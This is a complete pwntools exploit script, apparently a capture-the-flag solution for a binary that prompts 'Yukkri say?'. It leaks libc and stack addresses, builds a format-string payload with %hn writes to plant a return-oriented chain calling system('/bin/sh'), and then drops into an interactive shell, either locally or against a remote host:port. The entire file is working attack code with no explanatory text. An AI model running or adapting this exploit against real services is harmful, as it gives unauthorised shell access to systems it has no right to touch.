from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def generate_write_stack_payload(arg_off, values_to_write):
    payload = ''
    prev_printed_bytes = 0
    bytes_to_print = 0
    for i, val in enumerate(values_to_write):
        for j in range(3):
            offset = arg_off + i*3 + j
            num_to_construct = val & 0xffff
            bytes_to_print = (0x10000 + num_to_construct - prev_printed_bytes) & 0xffff
            prev_printed_bytes = num_to_construct
            val >>= 16
            payload += f'%{bytes_to_print}lx%{offset}$hn'

    return payload.encode()

def split_addr(addr):
    payload = b''
    for i in range(3):
        payload += p64(addr+i*2)
    return payload

def exp():
    sa(b'Yukkri say?\n', b'a'*0x98)
    libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym._IO_2_1_stderr_
    log.success(f'libc 0x{libc.address:x}')
    
    sla(b'/n)\n', b'Y')
    s(b'a'*0x100)
    stack_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
    log.success(f'stack_addr 0x{stack_addr:x}')

    rop_start_addr = stack_addr - 8
    # 0x0000000000401783 : pop rdi ; ret
    prdi = 0x401783
    # 0x000000000040101a : ret
    ret = 0x40101a
    binsh = next(libc.search(b'/bin/sh'))
    addr_system = libc.sym.system

    # ret| prdi | binsh | addr_system
    payload_addrs_write_to = b'ab' + split_addr(rop_start_addr)
    payload_addrs_write_to += split_addr(rop_start_addr+8)
    payload_addrs_write_to += split_addr(rop_start_addr+16)
    payload_addrs_write_to += split_addr(rop_start_addr+24)

    s(payload_addrs_write_to)
    sla(b'/n)\n', b'N')

    values_to_write_to_stack = [ret, prdi, binsh, addr_system]
    payload_write_rop_to_stack = generate_write_stack_payload(8, values_to_write_to_stack)

    pid_pause()
    sa(b'for you:', payload_write_rop_to_stack)
    # sa(b'for you:', b'%8$p')

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()